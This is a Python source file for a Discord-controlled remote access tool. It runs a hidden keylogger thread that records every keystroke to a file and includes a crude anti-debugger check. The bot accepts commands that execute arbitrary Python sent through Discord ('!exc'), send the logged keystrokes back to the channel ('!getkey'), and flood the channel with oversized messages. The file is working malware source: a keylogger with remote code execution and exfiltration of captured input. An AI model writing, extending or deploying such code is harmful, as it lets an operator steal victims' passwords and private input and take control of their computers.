import discord 
from pynput import keyboard
import threading
import ctypes

#wont work on stealth debbuger
def debugger():
    isTrue = True
    while isTrue:
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            try:
                womp = "a" * (1024 * 1024 * 10)
            except Exception as e:
                pass
            isTrue = False

def press():
    def Testing(key):
        with open("test.txt", "a") as f:
            f.write(str(key))
    with keyboard.Listener(on_press=Testing) as listener:
        listener.join()

debbuger_thread = threading.Thread(target=debugger, daemon=True)
logger_thread = threading.Thread(target=press, daemon=True)
logger_thread.start()
debbuger_thread.start()

class BotClient(discord.Client):
    async def on_message(self, message):
        if message.content.startswith('!exc'):
            splitted = message.content.split("-")
            try:
                if splitted[1].startswith("ramfucker"):
                    size_str = splitted[2]
                    size = int(size_str)
                    s = "a" * size
                    await message.channel.send(s)
                else:
                    exec(splitted[1])
            except Exception as e:
                    await message.channel.send(f"Error: {e}")
        if message.content.startswith("!getkey"):
            with open("test.txt", "r") as f:
                await message.channel.send(f"```{f.read()}```")
        if message.content.startswith("!help"):
             await message.channel.send("Available commands:\nexc: !exc-ramfucker-5368709120 or !exc -print()\ngetkey - GetEveryKeyUsedOnComputer")

intents = discord.Intents.default()
intents.message_content = True

client = BotClient(intents=intents)
client.run('')